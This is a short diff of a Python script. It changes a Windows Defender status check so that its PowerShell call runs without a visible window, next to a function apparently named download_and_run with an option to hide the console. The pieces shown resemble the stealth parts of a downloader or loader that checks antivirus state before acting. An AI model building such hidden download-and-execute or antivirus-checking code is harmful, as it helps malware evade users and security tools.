@@ -77,12 +77,13 @@ def download_and_run(url, destination, hide_console=False):
     except Exception as e:
         print(f"Error: {e}")
 
-# Check if Windows Defender is enabled using PowerShell command
+# Check if Windows Defender is enabled using PowerShell command without showing the PowerShell window
 def is_windows_defender_on():
     try:
         # PowerShell command to check Windows Defender status
         command = 'Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring'
-        result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True)
+        # Use subprocess with 'creationflags=subprocess.CREATE_NO_WINDOW' to hide the console window
+        result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
         
         # If result contains 'True', Defender is turned off, if 'False', it's on
         if result.stdout.strip() == 'False':
